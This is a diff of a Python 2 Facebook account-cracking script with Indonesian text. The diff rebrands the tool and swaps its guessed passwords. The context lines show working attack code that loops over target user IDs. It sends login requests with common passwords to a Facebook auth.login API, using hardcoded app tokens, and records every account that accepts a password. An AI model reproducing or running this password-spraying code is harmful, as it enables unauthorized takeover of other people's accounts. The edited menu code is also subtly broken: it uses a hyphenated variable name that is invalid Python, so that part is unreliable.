@@ -52,10 +52,10 @@ logo = """
 |  --  |  _  |   _||    <|______|       |    __|\033[1;97m
 |_____/|___._|__|  |__|__|      |__|_|__|______| \033[32m                                           
       \x1b[1;97m
-      \x1b[1;97m Author   :  \033[32m4njas
-      \x1b[1;97m Type     :  \033[32mDark-M2
-      \x1b[1;97m Version  :  \033[32m0.2
-      \x1b[1;97m Thanks   :  \033[32mBL4CK DR460N 
+      \x1b[1;97m Author   :  \033[32mSanto
+      \x1b[1;97m Type     :  \033[32mTutor
+      \x1b[1;97m Version  :  \033[32mV.0.0.1
+      \x1b[1;97m Thanks   :  \033[32mSAN-Brother 
       \x1b[1;97m
   """                                       
 
@@ -63,7 +63,7 @@ logo = """
 
 
 def tik():
-	titik = ['.  ','.. ','...']
+	titik = ['.  ','.. ','...','....']
 	for b in range(25):
 		for o in titik:
 			print("\r[●]Sedang login. Mohon tunggu \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(0.01)
@@ -86,7 +86,7 @@ def loginSC():
 	
 	username = raw_input("\033[1;96m[*]Username \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*]Password \033[1;91m: \033[1;92m")
-	if username =="anjas" and password =="210":
+	if username =="santo" and password =="030192":
 		time.sleep(1)
 		print '=========================='
 		jalan("\033[1;97m[+] L O A D I N G\033[1;91 .........................\033[1;92m100%Succes")
@@ -111,7 +111,7 @@ def notice():
 	print "Jika ingin mendapatkan password baru"
 	print "klik enter untuk Mengambil username/Password nya\n"
 	oh('[Tekan Enter Untuk Lanjut]')
-	os.system('xdg-open https://hokiciki.org/W30eZ')
+	os.system('xdg-open LINK-URL DISINI')
 	loginSC()
 
 
@@ -125,16 +125,16 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print "[+]Login To Your Account"
+		print "[+]Login Ke Akun Facebook"
 		print "\x1b[1;93m------------------------"
 		
 		id = raw_input('[+]ID/Email : ')
 		pwd = raw_input('[+]Password : ')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://mobile.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+			print"\n\033[1;96m[!] \x1b[1;91mCeleng, ora ndue peket internet arep ngehack, goblog!!!"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -213,27 +213,27 @@ def menu():
 
 
 def pilih():
-	anjas = raw_input("\n\033[1;97m\033[91mchoose >> \033[1;97m")
-	if anjas =="":
+	fb-m3dpr0 = raw_input("\n\033[1;97m\033[91mchoose >> \033[1;97m")
+	if fb-m3dpr0 =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih()
-	elif anjas =="1":
+	elif fb-m3dpr0 =="1":
 		super()
-	elif anjas =="2":
+	elif fb-m3dpr0 =="2":
 		grupsaya()
-	elif anjas =="3":
+	elif fb-m3dpr0 =="3":
 		informasi()
-	elif anjas =="4":
+	elif fb-m3dpr0 =="4":
 		yahoo()
-	elif anjas =="5":
+	elif fb-m3dpr0 =="5":
 		mini()
-	elif anjas =="6":
+	elif fb-m3dpr0 =="6":
 		menu_bot()
-	elif anjas =="7":
+	elif fb-m3dpr0 =="7":
 		check_akun()
-	elif anjas == '8':
+	elif fb-m3dpr0 == '8':
 		dump_member()
-	elif anjas =="0":
+	elif fb-m3dpr0 =="0":
 		os.system('clear')
 		jalan('Menghapus token')
 		os.system('rm -rf login.txt')
@@ -400,14 +400,14 @@ def pilih_super():
 								
 								oks.append(user+pass3)
 							else:
-									pass4 = 'sayang'
+									pass4 = 'I Love You'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
 										print '[OK] : \x1b[1;92m' + user + '|' + pass4
 										oks.append(user+pass4)
 									else:
-											pass5 = "bangsat"
+											pass5 = "Ngentot"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -415,7 +415,7 @@ def pilih_super():
 												print '[OK] : \x1b[1;92m' + user + '|' + pass5
 												oks.append(user+pass5)
 											else:
-													pass6 = 'anjing'
+													pass6 = 'Jablay'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
